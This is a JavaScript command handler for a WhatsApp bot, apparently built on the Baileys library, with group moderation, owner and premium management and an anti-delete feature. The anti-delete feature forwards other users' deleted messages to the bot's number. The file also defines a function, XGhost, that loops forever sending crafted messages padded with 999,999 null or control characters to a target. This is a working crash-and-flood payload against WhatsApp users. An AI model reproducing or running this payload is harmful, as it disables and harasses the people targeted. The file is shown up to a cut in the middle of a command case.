'use strict'
require('./setting/config')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const { runtime } = require('./System/Data1')
const speed = () => new Date().getTime()
const DB_PATH = './Database/db.json'
const ANTIDELETE_PATH = './Database/antidelete.json'
const ANTIUPDATE_PATH = './Database/gupdates.json'

const getLocalDb = () => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify({ dbadd: [] }, null, 2))
        const raw = fs.readFileSync(DB_PATH)
        const parsed = JSON.parse(raw)
        return parsed.dbadd || []
    } catch (e) {
        console.error('DB Read Error:', e.message)
        return []
    }
}

const saveLocalDb = (db) => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        fs.writeFileSync(DB_PATH, JSON.stringify({ dbadd: db }, null, 2))
    } catch (e) {
        console.error('DB Save Error:', e.message)
    }
}

const getAntiDelete = () => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        if (!fs.existsSync(ANTIDELETE_PATH)) fs.writeFileSync(ANTIDELETE_PATH, JSON.stringify({ chats: [] }, null, 2))
        const raw = fs.readFileSync(ANTIDELETE_PATH)
        return JSON.parse(raw).chats || []
    } catch (e) {
        return []
    }
}

const saveAntiDelete = (chats) => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        fs.writeFileSync(ANTIDELETE_PATH, JSON.stringify({ chats }, null, 2))
    } catch (e) {        console.error('AntiDelete Save Error:', e.message)
    }
}

const getGUpdates = () => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        if (!fs.existsSync(ANTIUPDATE_PATH)) fs.writeFileSync(ANTIUPDATE_PATH, JSON.stringify({ chats: [] }, null, 2))
        const raw = fs.readFileSync(ANTIUPDATE_PATH)
        return JSON.parse(raw).chats || []
    } catch (e) {
        return []
    }
}

const saveGUpdates = (chats) => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        fs.writeFileSync(ANTIUPDATE_PATH, JSON.stringify({ chats }, null, 2))
    } catch (e) {
        console.error('GUpdates Save Error:', e.message)
    }
}

const ANTILINK_PATH = './Database/antilink.json'
const ANTIMEDIA_PATH = './Database/antimedia.json'

const getAntiLink = () => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        if (!fs.existsSync(ANTILINK_PATH)) fs.writeFileSync(ANTILINK_PATH, JSON.stringify({ groups: {} }, null, 2))
        const raw = fs.readFileSync(ANTILINK_PATH)
        return JSON.parse(raw).groups || {}
    } catch (e) {
        return {}
    }
}

const saveAntiLink = (groups) => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        fs.writeFileSync(ANTILINK_PATH, JSON.stringify({ groups }, null, 2))
    } catch (e) {
        console.error('AntiLink Save Error:', e.message)
    }
}

const getAntiMedia = () => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        if (!fs.existsSync(ANTIMEDIA_PATH)) fs.writeFileSync(ANTIMEDIA_PATH, JSON.stringify({ groups: {} }, null, 2))
        const raw = fs.readFileSync(ANTIMEDIA_PATH)
        return JSON.parse(raw).groups || {}
    } catch (e) {
        return {}
    }
}

const saveAntiMedia = (groups) => {
    try {
        if (!fs.existsSync('./Database')) fs.mkdirSync('./Database', { recursive: true })
        fs.writeFileSync(ANTIMEDIA_PATH, JSON.stringify({ groups }, null, 2))
    } catch (e) {
        console.error('AntiMedia Save Error:', e.message)
    }
}

const getMediaType = (message) => {
    if (!message) return null
    if (message.conversation) return 'text'
    if (message.extendedTextMessage) return 'text'
    if (message.imageMessage) return 'image'
    if (message.videoMessage) return 'video'
    if (message.audioMessage) return 'audio'
    if (message.stickerMessage) return 'sticker'
    if (message.documentMessage) return 'document'
    if (message.contactMessage) return 'contact'
    if (message.locationMessage) return 'location'
    return null
}

const eseQuoted = (keyId = '0') => ({
    key: { participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net', id: keyId },
    message: { conversation: 'Ese✧⁠*' },
    contextInfo: { mentionedJid: [], forwardingScore: 999, isForwarded: true }
})

const containsLink = (text) => {
    const linkRegex = /(https?:\/\/[^\s]+|www.[^\s]+|[a-zA-Z0-9-]+.(com|net|org|io|co|pk|info|biz|me|ly|gg|app|dev|xyz|link|click|site|online|store|shop|chat|group|invite)[^\s]*|chat.whatsapp.com\/[^\s]+)/gi
    return linkRegex.test(text)
}

const handleAntiLink = async (sock, m) => {
    try {
        if (!m.isGroup) return
        if (!m.message) return
        const from = m.chat
        const sender = m.sender
        const BotNum = sock.user.id.split(':')[0] + '@s.whatsapp.net'

        if (sender === BotNum) return

        const groups = getAntiLink()
        const mode = groups[from]

        if (!mode || mode === 'off') return

        const body = m.text || ''
        if (!containsLink(body)) return

        const time = moment().tz(global.timezone).format('HH:mm:ss')
        const todayDate = moment().tz(global.timezone).format('DD MMMM YYYY')

        let groupName = 'Unknown'
        try {
            const meta = await sock.groupMetadata(from)
            groupName = meta?.subject || 'Unknown'
        } catch (e) {
            groupName = 'Unknown'
        }

        const senderNumber = sender.split('@')[0]
        const pushname = m.pushName || 'No Name'

        const infoText =
            `┏━━━━━━━━━━━━━━━━━━━━━━┓\n` +
            `┃  🔗 *Link Detected* 🚫 🔗\n` +
            `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
            `👤 *Name        :* ${pushname}\n` +
            `📞 *Number      :* ${senderNumber}\n` +
            `👥 *Group       :* ${groupName}\n` +
            `⏰ *Time        :* ${time}\n` +
            `📅 *Date        :* ${todayDate}\n\n` +
            `⚠️ *Links are not allowed in this group!*\n` +
            `✨ *Powered by ${global.botName}* ✨`

        await sock.sendMessage(from, { delete: m.key })

        if (mode === 'delete') {
            await sock.sendMessage(from, { text: infoText }, { quoted: eseQuoted() })
        } else if (mode === 'remove') {
            await sock.sendMessage(from, { text: infoText }, { quoted: eseQuoted() })
            try {
                await sock.groupParticipantsUpdate(from, [sender], 'remove')
            } catch (e) {                await sock.sendMessage(from, { text: `Could not remove ${pushname} from group. Bot may not be admin.` }, { quoted: eseQuoted() })
            }
        }
    } catch (e) {
        console.error('AntiLink Handler Error:', e.message)
    }
}

const msgCache = new Map()

const handleAntiMedia = async (sock, m) => {
    try {
        if (!m.isGroup) return
        if (!m.message) return
        
        const from = m.chat
        const sender = m.sender
        const BotNum = sock.user.id.split(':')[0] + '@s.whatsapp.net'

        if (sender === BotNum) return

        const mediaType = getMediaType(m.message)
        if (!mediaType) return

        const groups = getAntiMedia()
        const settings = groups[from] || {}
        const mode = settings[mediaType]

        if (!mode || mode === 'off') return

        const time = moment().tz(global.timezone).format('HH:mm:ss')
        const todayDate = moment().tz(global.timezone).format('DD MMMM YYYY')

        let groupName = 'Unknown'
        try {
            const meta = await sock.groupMetadata(from)
            groupName = meta?.subject || 'Unknown'
        } catch (e) {
            groupName = 'Unknown'
        }

        const senderNumber = sender.split('@')[0]
        const pushname = m.pushName || 'No Name'

        const mediaEmoji = {
    text: '💬', image: '🖼️', video: '🎥', audio: '🎵', sticker: '🎨',
    document: '📄', contact: '👤', location: '📍'
}

        const mediaName = {
    text: 'Message', image: 'Image', video: 'Video', audio: 'Audio', sticker: 'Sticker',
    document: 'Document', contact: 'Contact', location: 'Location'
}

        const infoText =
            `┏━━━━━━━━━━━━━━━━━━━━━━┓\n` +
            `┃  ${mediaEmoji[mediaType]} *${mediaName[mediaType].toUpperCase()} DETECTED* ${mediaEmoji[mediaType]}\n` +
            `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
            `👤 *Name        :* ${pushname}\n` +
            `📞 *Number      :* ${senderNumber}\n` +
            `👥 *Group       :* ${groupName}\n` +
            `⏰ *Time        :* ${time}\n` +
            `📅 *Date        :* ${todayDate}\n\n` +
            `⚠️ *${mediaName[mediaType]}s are not allowed in this group!*\n` +
            `✨ *Powered by ${global.botName}* ✨`

        await sock.sendMessage(from, { delete: m.key })

        if (mode === 'delete') {
            await sock.sendMessage(from, { text: infoText }, { quoted: eseQuoted() })
        } else if (mode === 'remove') {
            await sock.sendMessage(from, { text: infoText }, { quoted: eseQuoted() })
            try {
                await sock.groupParticipantsUpdate(from, [sender], 'remove')
            } catch (e) {
                await sock.sendMessage(from, { text: `Could not remove ${pushname} from group. Bot may not be admin.` }, { quoted: eseQuoted() })
            }
        }
    } catch (e) {
        console.error('AntiMedia Handler Error:', e.message)
    }
}

const handleAntiDelete = async (sock, deletedKey) => {
    try {
        const antiChats = getAntiDelete()
        const chatId = deletedKey.remoteJid
        if (!antiChats.includes(chatId)) return
        const cached = msgCache.get(deletedKey.id)
        if (!cached) return

        const { downloadMediaMessage } = require('@whiskeysockets/baileys')
        const time = moment().tz(global.timezone).format('HH:mm:ss')
        const todayDate = moment().tz(global.timezone).format('DD MMMM YYYY')
        const isGroup = chatId.endsWith('@g.us')

        let groupName = cached.groupName || null
        if (isGroup && !groupName) {
            try {
                const meta = await sock.groupMetadata(chatId)
                groupName = meta?.subject || 'Unknown'
            } catch {
                groupName = 'Unknown'
            }
        }
        const BotNum = sock.user.id.split(':')[0] + '@s.whatsapp.net'
        const sendTo = BotNum

        const info =
            `┏━━━━━━━━━━━━━━━━━━━━━━┓\n` +
            `┃  🗑️ *ANTI-DELETE ALERT*\n` +
            `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
            `👤 *Name   :* ${cached.pushname}\n` +
            `📞 *Number :* ${cached.sender.split('@')[0]}\n` +
            (isGroup ? `👥 *Group  :* ${groupName || 'Unknown'}\n` : `💬 *Chat   :* Private\n`) +
            `⏰ *Time   :* ${time}\n` +
            `📅 *Date   :* ${todayDate}\n` +
            `✨ *Powered by ${global.botName}* ✨`

        const msgType = Object.keys(cached.message)[0]
        const inner = cached.message[msgType]

        if (msgType === 'conversation') {
            await sock.sendMessage(sendTo, { text: `${info}\n\n💬 *Message :* ${inner}` }, { quoted: eseQuoted() })
        } else if (msgType === 'extendedTextMessage') {
            await sock.sendMessage(sendTo, { text: `${info}\n\n💬 *Message :* ${inner?.text || ''}` }, { quoted: eseQuoted() })        } else if (['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(msgType)) {
            const fakeMsg = {
                key: { remoteJid: chatId, id: deletedKey.id, fromMe: cached.fromMe, participant: cached.participant },
                message: cached.message
            }
            const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {})
            const caption = inner?.caption ? `${info}\n\n📝 *Caption :* ${inner.caption}` : info
            if (msgType === 'imageMessage') {
                await sock.sendMessage(sendTo, { image: buffer, caption }, { quoted: eseQuoted() })
            } else if (msgType === 'videoMessage') {
                await sock.sendMessage(sendTo, { video: buffer, caption, mimetype: inner?.mimetype || 'video/mp4' }, { quoted: eseQuoted() })
            } else if (msgType === 'audioMessage') {
                await sock.sendMessage(sendTo, { audio: buffer, mimetype: inner?.mimetype || 'audio/mp4', ptt: inner?.ptt || false }, { quoted: eseQuoted() })
            } else if (msgType === 'stickerMessage') {
                await sock.sendMessage(sendTo, { sticker: buffer }, { quoted: eseQuoted() })
            } else {
                await sock.sendMessage(sendTo, { document: buffer, mimetype: inner?.mimetype || 'application/octet-stream', fileName: inner?.fileName || 'file', caption }, { quoted: eseQuoted() })
            }
        }
    } catch (e) {
        console.error('AntiDelete Error:', e.message)
    }
}

const handleGroupUpdates = async (sock, update) => {
    try {
        const activeChats = getGUpdates()
        if (!activeChats.includes(update.id)) return

        const participants = update.participants
        if (!participants || participants.length === 0) return

        const time = moment().tz(global.timezone).format('HH:mm:ss')
        const todayDate = moment().tz(global.timezone).format('DD MMMM YYYY')
        const BotNum = sock.user.id.split(':')[0] + '@s.whatsapp.net'
        
        let groupName = 'Unknown'
        let participantsMap = new Map()
        
        try {
            const meta = await sock.groupMetadata(update.id)
            groupName = meta.subject || 'Unknown'
            
            for (const p of meta.participants) {
                const lid = p.id
                const realJid = p.jid
                const realNumber = realJid.split('@')[0]
                const lidNumber = lid.split('@')[0]
                
                const participantInfo = {
                    number: realNumber,
                    lid: lid,
                    realJid: realJid
                }
                
                participantsMap.set(lid, participantInfo)
                participantsMap.set(lidNumber, participantInfo)
                participantsMap.set(realJid, participantInfo)
                participantsMap.set(realNumber, participantInfo)
            }
        } catch (e) {
            console.error('Error getting group metadata:', e.message)
        }

        const botName = global.botName || 'WhatsApp Bot'

        const getParticipantNumber = (identifier) => {
            if (!identifier) return null
            
            let idStr = identifier.toString()
            
            if (participantsMap.has(idStr)) {
                return participantsMap.get(idStr).number
            }
            
            if (idStr.includes('@lid')) {
                const number = idStr.split('@')[0]
                if (participantsMap.has(number)) {
                    return participantsMap.get(number).number
                }
                return number
            }
            
            if (!idStr.includes('@')) {
                const withJid = idStr + '@s.whatsapp.net'
                if (participantsMap.has(withJid)) {
                    return participantsMap.get(withJid).number
                }
            }
            
            return idStr.split('@')[0]
        }

        for (const num of participants) {
            const targetNumber = getParticipantNumber(num)
            
            let actorNumber = 'System'
            let actionText = ''
            let icon = ''

            if (update.action === 'add') {
                icon = '🌟'
                actionText = 'Joined the group'
                if (update.author) {
                    actorNumber = getParticipantNumber(update.author)
                } else {
                    actorNumber = 'System'
                }
            } else if (update.action === 'remove') {
                icon = '👋'
                actionText = 'Left or was removed'
                if (update.author) {
                    actorNumber = getParticipantNumber(update.author)
                } else {
                    actorNumber = 'System'
                }
            } else if (update.action === 'promote') {
                icon = '⬆️'
                actionText = 'Promoted to Admin'
                if (update.author) {
                    actorNumber = getParticipantNumber(update.author)
                } else {
                    actorNumber = 'System'
                }
            } else if (update.action === 'demote') {
                icon = '⬇️'
                actionText = 'Demoted from Admin'
                if (update.author) {
                    actorNumber = getParticipantNumber(update.author)
                } else {
                    actorNumber = 'System'
                }
            }

            const reportText = 
                `┏━━━━━━━━━━━━━━━━━━━━━━┓\n` +
                `┃  ${icon} *GROUP UPDATE ALERT*\n` +
                `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
                `🤖 *Bot        :* ${botName}\n` +
                `👥 *Group      :* ${groupName}\n` +
                `🔹 *Action     :* ${actionText}\n` +
                `🔸 *Actor Num  :* ${actorNumber}\n` +
                `📞 *Target Num :* ${targetNumber}\n` +
                `⏰ *Time       :* ${time}\n` +
                `📅 *Date       :* ${todayDate}\n` +
                `✨ *Powered by ${botName}* ✨`

            await sock.sendMessage(BotNum, { text: reportText }, { quoted: eseQuoted() })
        }
        
    } catch (e) {
        console.error('Group Update Handler Error:', e.message)
    }
}


  async function XGhost(sock, target) {
      const { generateWAMessageFromContent } = require('@whiskeysockets/baileys')
      while (true) {
          try {
              const msg1 = await generateWAMessageFromContent(target, {
                  groupStatusMessageV2: {
                      message: {
                          interactiveResponseMessage: {
                              body: { text: 't.me/A1xle' },
                              nativeFlowResponseMessage: {
                                  name: 'galaxy_message',
                                  paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
                                  version: 3
                              }
                          }
                      }
                  }
              }, { userJid: target })

              const msg2 = await generateWAMessageFromContent(target, {
                  groupStatusMessageV2: {
                      message: {
                          interactiveResponseMessage: {
                              body: { text: 't.me/A1xle' },
                              nativeFlowResponseMessage: {
                                  name: 'galaxy_message',
                                  paramsJson: `{"flow_cta":"${"\x10".repeat(999999)}"}`,
                                  version: 3
                              }
                          }
                      }
                  }
              }, { userJid: target })

              await sock.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id })
              await sock.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id })
          } catch (error) {
              console.error('[XGhost Error]:', error.message)
          }
      }
  }

  module.exports = async function SarDevHandler(sock, m, chatUpdate, store) {
    try {
        if (!m.message) return
        const body = m.text || ''
        const usedPrefix = body.trim()[0]
        const validPrefixes = ['.', '!', '/', '#', '^']
        const hasPrefix = validPrefixes.includes(usedPrefix)
        const command = hasPrefix
            ? body.trim().slice(1).split(/ +/).shift().toLowerCase()
            : body.trim().split(/ +/).shift().toLowerCase()
        const args = hasPrefix
            ? body.trim().slice(1).split(/ +/).slice(1)
            : body.trim().split(/ +/).slice(1)
        const qtext = args.join(' ')

        const from = m.chat
        const sender = m.sender
        const isGroup = m.isGroup
        const pushname = m.pushName || 'No Name'
        const BotNum = sock.user.id.split(':')[0] + '@s.whatsapp.net'

        const time = moment().tz(global.timezone).format('HH:mm:ss')
        const todayDate = moment().tz(global.timezone).format('DD MMMM YYYY')

        let Owner = JSON.parse(fs.readFileSync(global.ownPath))
        let Premium = JSON.parse(fs.readFileSync(global.premPath))
        let Idgb = JSON.parse(fs.readFileSync(global.idgrpPath))

        const CreatorOnly = [BotNum, ...Owner].includes(sender)
        const PremOnly = [BotNum, ...Premium].includes(sender)
        const isUnli = Idgb.includes(from)

        if (m.message && m.key?.id) {
            msgCache.set(m.key.id, {
                message: m.message,
                sender: sender,
                pushname: pushname,
                fromMe: m.key.fromMe || false,
                participant: m.key.participant || null,
                groupName: isGroup ? (m.groupMetadata?.subject || store?.chats?.get(from)?.name || null) : null
            })
            if (msgCache.size > 1000) {
                const firstKey = msgCache.keys().next().value
                msgCache.delete(firstKey)
            }
        }

        await handleAntiLink(sock, m)
        await handleAntiMedia(sock, m)

        if (!sock.public && !CreatorOnly) return

        const THUMB = global.thumb
        let THUMB_LOCAL
        if (global.thumbLocal && fs.existsSync(global.thumbLocal)) {
            THUMB_LOCAL = fs.readFileSync(global.thumbLocal)
        } else {
            THUMB_LOCAL = global.thumb
        }
        
        const ReplySuccess = (text) => sock.sendMessage(from, {
            text: `${text}` }, { quoted: eseQuoted(m.key.id) })

        const ReplyFailed = (text) => sock.sendMessage(from, {
            text: `${text}` }, { quoted: eseQuoted(m.key.id) })

        const ReplySar = (text) => sock.sendMessage(from, {
            text: `⚠️ No Data Found\n\n${text}` }, { quoted: eseQuoted(m.key.id) })

        switch (command) {

            case 'toxic':
            case 'bot':
            case 'start':
            case 'ese':
            case 'esebot': {
                const name = pushname

                await sock.sendMessage(from, { react: { text: '💗', key: m.key } })

                const now = moment().tz(global.timezone)
                const timeStr = now.format('HH:mm:ss')
                const dateStr = now.format('DD MMMM YYYY')

                const teks =
`┏━━━━━━━━━━━━━━━━━━━━━━┓
┃  💗 *${global.botName}* 💗
┗━━━━━━━━━━━━━━━━━━━━━━┛

👤 *Hello,* ${name}!
🕐 *Time :* ${timeStr}
📅 *Date :* ${dateStr}

┌─── ✦ *💅 BOT INFO* ✦ ───┐
│ 🤖 *Bot    :* ${global.botName}
│ 👑 *Owner  :* ${global.botAuthor}
│ 🔖 *Script :* ToxicxBotz
│ 🔑 *Prefix :* [ . ] multi
│ 📶 *Mode   :* Public
└───────────────────────┘

┌─── ✦ *⚙️ SETTINGS* ✦ ───┐
│ ᵖᵘᵇˡⁱᶜ  →  public mode
│ ˢᵉˡᶠ    →  self mode
└───────────────────────────┘

┌─── ✦ *💾 DATABASE* ✦ ───┐
│ ᵃᵈᵈᵇ    →  add new db
│ ᵈᵉˡᵈᵇ   →  delete db
│ ˡⁱˢᵗᵈᵇ  →  list db
└───────────────────────────┘

┌─── ✦ *👑 GROUP TOOLS* ✦ ───┐
│ ᵗᵃᵍᵃˡˡ       →  tag all members
│ ᵏⁱᶜᵏᵃˡˡ      →  kick all members
│ ᵃᵈᵈ          →  add number
│ ᵏⁱᶜᵏ         →  kick number
│ ᵈᵉᵐᵒᵗᵉ      →  demote number
│ ᵖʳᵒᵐᵒᵗᵉ     →  promote number
│ ᵃⁿᵗⁱᵈᵉˡ     →  off , on
│ ᵛᵛ           →  recover once
│ ᵍᵘᵖᵈᵃᵗᵉˢ    →  on , off
│ ᵃⁿᵗⁱᵐᵉᵈⁱᵃ   →  view settings
└──────────────────────────────┘

┌─── ✦ *🛡️ PROTECTION* ✦ ───┐
│ ᵃⁿᵗⁱᵗᵉˣᵗ      →  off/delete/remove
│ ᵃⁿᵗⁱˢᵗⁱᶜᵏᵉʳ   →  off/delete/remove
│ ᵃⁿᵗⁱⁱᵐᵃᵍᵉ     →  off/delete/remove
│ ᵃⁿᵗⁱᵛⁱᵈᵉᵒ     →  off/delete/remove
│ ᵃⁿᵗⁱᵃᵘᵈⁱᵒ     →  off/delete/remove
│ ᵃⁿᵗⁱᵈᵒᶜᵘᵐᵉⁿᵗ  →  off/delete/remove
│ ᵃⁿᵗⁱᶜᵒⁿᵗᵃᶜᵗ   →  off/delete/remove
│ ᵃⁿᵗⁱˡᵒᶜᵃᵗⁱᵒⁿ  →  off/delete/remove
│ ᵃⁿᵗⁱˡⁱⁿᵏ      →  off/delete/remove
│ ᵃⁿᵗⁱᵃˡˡ       →  off/delete/remove
└──────────────────────────────┘

┌─── ✦ *🌸 OWNER PANEL* ✦ ───┐
│ ᵃᵈᵈᵒʷⁿ    →  add owner
│ ᵈᵉˡᵒʷⁿᵉʳ  →  remove owner
│ ˡⁱˢᵗᵒʷⁿᵉʳ →  list owners
│ ᵃᵈᵈᵖʳᵉᵐ   →  add premium user
│ ᵈᵉˡᵖʳᵉᵐ   →  remove premium
│ ˡⁱˢᵗᵖʳᵉᵐ  →  list premium users
└──────────────────────────────┘

┗━✨ *Powered by ${global.botName}* ✨━┛`
                const menuFakeQ = eseQuoted(m.key.id)
menuFakeQ.contextInfo.mentionedJid = [sender]

await sock.sendMessage(from, {
    text: teks,
}, { quoted: menuFakeQ })

                break
            }

            case 'gupdates': {
                if (!CreatorOnly) return ReplyFailed('Access denied ❌')
                if (!isGroup) return ReplyFailed('This command can only be used in a group')
                
                const guChats = getGUpdates()
                const subCmd = args[0]?.toLowerCase()

                if (subCmd === 'on') {
                    if (guChats.includes(from)) return ReplyFailed('Group Updates are already ON here')
                    guChats.push(from)
                    saveGUpdates(guChats)
                    return ReplySuccess('Group Updates Monitor is now *ON*\nAll join/leave/promote/demote events will be sent to Bot.')
                } else if (subCmd === 'off') {
                    const idx = guChats.indexOf(from)
                    if (idx === -1) return ReplyFailed('Group Updates are already OFF here')
                    guChats.splice(idx, 1)
                    saveGUpdates(guChats)
                    return ReplySuccess('Group Updates Monitor is now *OFF* ❌')
                } else {
                    return ReplyFailed(`Usage: ${command} on/off`)
                }
            }

            case 'antilink': {
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (!isGroup) return ReplyFailed('This command can only be used in groups')
                const alGroups = getAntiLink()
                const alSubCmd = args[0]?.toLowerCase()
                if (alSubCmd === 'off') {
                    alGroups[from] = 'off'
                    saveAntiLink(alGroups)
                    return ReplySuccess('Anti-Link is now *OFF*\nNo action will be taken on links')
                } else if (alSubCmd === 'delete') {
                    alGroups[from] = 'delete'
                    saveAntiLink(alGroups)
                    return ReplySuccess('Anti-Link is now *DELETE*\nLinks will be deleted and group details will be shown')
                } else if (alSubCmd === 'remove') {
                    alGroups[from] = 'remove'
                    saveAntiLink(alGroups)
                    return ReplySuccess('Anti-Link is now *REMOVE*\nLinks will be deleted and sender will be removed from group')
                } else {
                    return ReplyFailed(`Usage: ${command} off , delete , remove`)
                }
            }
            case 'antidel':
            case 'antidelete': {
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                const adChats = getAntiDelete()
                const subCmd = args[0]?.toLowerCase()
                if (subCmd === 'on') {
                    if (adChats.includes(from)) return ReplyFailed('Anti-Delete is already ON here')
                    adChats.push(from)
                    saveAntiDelete(adChats)
                    return ReplySuccess('Anti-Delete is now *ON*\nDeleted messages will be recovered automatically')
                } else if (subCmd === 'off') {
                    const idx = adChats.indexOf(from)
                    if (idx === -1) return ReplyFailed('Anti-Delete is already OFF here')
                    adChats.splice(idx, 1)
                    saveAntiDelete(adChats)
                    return ReplySuccess('Anti-Delete is now *OFF*')
                } else {
                    return ReplyFailed(`Usage: ${command} on/off`)
                }
            }

            case 'addb':
            case 'adddb':
            case 'addatabase':
            case 'adddatabase': {
                if (!PremOnly && !isUnli) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)

                const nomor = qtext.replace(/[^0-9]/g, '')
                const db = getLocalDb()
                if (db.includes(nomor)) return ReplyFailed('That number already exists in the database')

                db.push(nomor)
                saveLocalDb(db)
                ReplySuccess(`Number ${nomor} successfully added to database`)
                break
            }

            case 'listdb':
            case 'listdatabase': {
                if (!PremOnly && !isUnli) return ReplyFailed('Access Denied')

                const db = getLocalDb()
                if (db.length === 0) return ReplySar('The database is empty')

                const list = db.map((item, i) => `*${i + 1}.* ${item}`).join('\n')
                ReplySuccess(`*Registered Numbers:*\n\n${list}`)
                break
            }
            case 'deldb':
            case 'deldatabase': {
                if (!PremOnly && !isUnli) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)

                const db = getLocalDb()
                const index = db.indexOf(qtext)
                if (index === -1) return ReplyFailed(`Number ${qtext} not found in database`)

                db.splice(index, 1)
                saveLocalDb(db)
                ReplySuccess(`Number *${qtext}* successfully removed from database`)
                break
            }

            case 'addowner':
            case 'addown':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)
                var numero = qtext.split('|')[0].replace(/[^0-9]/g, '')
                var loadnum = await sock.onWhatsApp(numero + '@s.whatsapp.net')
                if (loadnum.length === 0) return ReplyFailed('Number is not registered on WhatsApp')
                Owner.push(numero)
                Premium.push(numero)
                fs.writeFileSync(global.ownPath, JSON.stringify(Owner))
                fs.writeFileSync(global.premPath, JSON.stringify(Premium))
                ReplySuccess(`Number ${numero} successfully added as Owner`)
                break

            case 'delowner':
            case 'delown':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)
                var numero2 = qtext.split('|')[0].replace(/[^0-9]/g, '')
                var numeroX = Owner.indexOf(numero2)
                var numload = Premium.indexOf(numero2)
                Owner.splice(numeroX, 1)
                Premium.splice(numload, 1)
                fs.writeFileSync(global.ownPath, JSON.stringify(Owner))
                fs.writeFileSync(global.premPath, JSON.stringify(Premium))
                ReplySuccess(`Number ${numero2} successfully removed from Owner`)
                break

            case 'listown':
            case 'listowner':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (Owner.length === 0) return ReplySar('Owner list is empty')
                var ownerList = Owner.map((num, i) => `*${i + 1}.* ${num}`).join('\n')
                ReplySuccess(`*Registered Owners:*\n\n${ownerList}`);
break

            case 'addprem':
            case 'addpremium':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)
                var premNum = qtext.replace(/[^0-9]/g, '')
                if (Premium.includes(premNum)) return ReplyFailed('This number is already Premium')
                Premium.push(premNum)
                fs.writeFileSync(global.premPath, JSON.stringify(Premium, null, 2))
                ReplySuccess(`Number ${premNum} successfully added as Premium`)
                break

            case 'delprem':
            case 'delpremium':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (!args[0]) return ReplyFailed(`Usage: ${command} 923xxxxxxxxxx`)
                var premNum2 = qtext.replace(/[^0-9]/g, '')
                var premIndex = Premium.indexOf(premNum2)
                if (premIndex === -1) return ReplyFailed('Number not found in Premium list')
                Premium.splice(premIndex, 1)
                fs.writeFileSync(global.premPath, JSON.stringify(Premium, null, 2))
                ReplySuccess(`Number ${premNum2} successfully removed from Premium`)
                break

            case 'listprem':
            case 'listpremium':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                if (Premium.length === 0) return ReplySar('Premium list is empty')
                var premList = Premium.map((num, i) => `*${i + 1}.* ${num}`).join('\n')
                ReplySuccess(`*Registered Premium Users:*\n\n${premList}`)
                break

            case 'public':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                sock.public = true
                ReplySuccess('Bot is now in *PUBLIC* mode 🌍')
                break

            case 'self':
            case 'private':
                if (!CreatorOnly) return ReplyFailed('Access Denied')
                sock.public = false
                ReplySuccess('Bot is now in *SELF* mode 🔒')
                break
                
case 'antitext':
case 'antimsg': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.text = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Text is now *OFF*\nText messages are allowed')
    } else if (subCmd === 'delete') {
        current.text = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Text is now *DELETE*\nText messages will be deleted')
    } else if (subCmd === 'remove') {
        current.text = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Text is now *REMOVE*\nText messages will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}


case 'antisticker':
case 'antis': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.sticker = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Sticker is now *OFF*\nStickers are allowed')
    } else if (subCmd === 'delete') {
        current.sticker = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Sticker is now *DELETE*\nStickers will be deleted')
    } else if (subCmd === 'remove') {
        current.sticker = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
